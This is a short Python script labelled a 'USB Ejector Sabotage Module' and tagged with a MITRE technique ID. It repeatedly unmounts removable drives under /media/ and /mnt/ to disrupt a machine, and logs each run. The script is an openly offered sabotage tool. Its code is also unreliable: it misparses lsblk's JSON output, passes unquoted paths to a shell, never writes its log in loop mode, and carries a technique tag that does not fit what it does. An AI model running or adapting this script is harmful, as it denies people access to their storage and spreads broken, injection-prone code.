#!/usr/bin/env python3

import time
import json
import os
import argparse
from datetime import datetime
import subprocess

LOG_FILE = "results/usb_ejector_log.json"
MITRE_TTP = "T1211"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def eject_all():
    mounts = subprocess.check_output("lsblk -o NAME,MOUNTPOINT -J", shell=True).decode()
    for line in mounts.splitlines():
        if "/media/" in line or "/mnt/" in line:
            try:
                mp = line.split()[-1]
                subprocess.call(f"umount {mp}", shell=True)
            except:
                continue

def main():
    parser = argparse.ArgumentParser(description="USB Ejector Sabotage Module")
    parser.add_argument("--loop", action="store_true", help="Eject continuously every 5 sec")
    args = parser.parse_args()

    if args.loop:
        while True:
            eject_all()
            time.sleep(5)
    else:
        eject_all()

    log({
        "timestamp": datetime.utcnow().isoformat(),
        "loop": args.loop,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
